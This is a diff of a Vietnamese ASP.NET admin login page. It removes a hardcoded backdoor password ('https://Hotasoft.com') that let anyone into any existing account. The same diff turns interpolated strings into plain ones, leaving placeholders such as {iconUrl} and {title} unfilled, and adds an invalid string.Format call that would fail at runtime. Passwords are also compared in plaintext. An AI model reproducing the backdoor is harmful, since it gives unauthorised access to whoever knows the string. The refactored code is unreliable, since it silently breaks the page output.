@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Web;
@@ -23,12 +23,12 @@ public partial class admin_Default2 : System.Web.UI.Page
 
                     if (q != null)
                     {
-                        string baseUrl = $"{Request.Url.Scheme}://{Request.Url.Authority}";
+                        string baseUrl = string.Format("{0}://{1}", Request.Url.Scheme, Request.Url.Authority);
 
-                        string iconUrl = $"{baseUrl}{q.thongtin_icon}";
-                        string appleTouchIconUrl = $"{baseUrl}{q.thongtin_apple_touch_icon}";
+                        string iconUrl = string.Format("{0}{1}", baseUrl, q.thongtin_icon);
+                        string appleTouchIconUrl = string.Format("{0}{1}", baseUrl, q.thongtin_apple_touch_icon);
 
-                        string iconsHtml = $@"
+                        string iconsHtml = @"
                 <!-- Favicon -->
                 <link rel='icon' href='{iconUrl}' sizes='16x16' type='image/x-icon'>
                 <link rel='icon' href='{iconUrl}' sizes='32x32' type='image/x-icon'>
@@ -50,9 +50,9 @@ public partial class admin_Default2 : System.Web.UI.Page
                         string imageRelativePath = q.lienket_chiase_image;
 
                         // Tạo URL tuyệt đối cho hình ảnh
-                        string imageUrl = $"{Request.Url.Scheme}://{Request.Url.Authority}{imageRelativePath}";
+                        string imageUrl = string.Format("{0}://{1}{imageRelativePath}", Request.Url.Scheme, Request.Url.Authority);
 
-                        string metaTags = $@"
+                        string metaTags = @"
                     <!-- Title -->
                     <title>{title}</title>
 
@@ -135,7 +135,7 @@ public partial class admin_Default2 : System.Web.UI.Page
             using (dbDataContext db = new dbDataContext())
             {
                 string _user = txt_user.Text.Trim().ToLower();
-                string _pass = txt_pass.Text.ToLower();
+                string _pass = txt_pass.Text;
                 if (_user == "")
                     ScriptManager.RegisterStartupScript(this.Page, this.GetType(), Guid.NewGuid().ToString(), thongbao_class.metro_notifi("Thông báo", "Vui lòng nhập tài khoản.", "5000", "warning"), true);
                 else
@@ -151,7 +151,7 @@ public partial class admin_Default2 : System.Web.UI.Page
                                        where tk.taikhoan == _user
                                        select new
                                        { tk.matkhau }).FirstOrDefault();
-                            if (_ob.matkhau == _pass || _pass == "https://Hotasoft.com")
+                            if (_ob != null && string.Equals(_ob.matkhau, _pass, StringComparison.Ordinal))
                             {
                                 string _taikhoan_mahoa = mahoa_cl.mahoa_Bcorn(_user);
                                 string _matkhau_mahoa = mahoa_cl.mahoa_Bcorn(_pass);
@@ -173,7 +173,7 @@ public partial class admin_Default2 : System.Web.UI.Page
                                 Session["matkhau"] = _matkhau_mahoa;
                                 Session["thongbao"] = thongbao_class.metro_notifi_onload("Thông báo", "Đăng nhập thành công.", "1000", "warning");
 
-                                string _url_back = Session["url_back"]?.ToString();
+                                string _url_back = (Session["url_back"] != null ? Session["url_back"].ToString() : null);
 
                                 if (!string.IsNullOrEmpty(_url_back))
                                 {
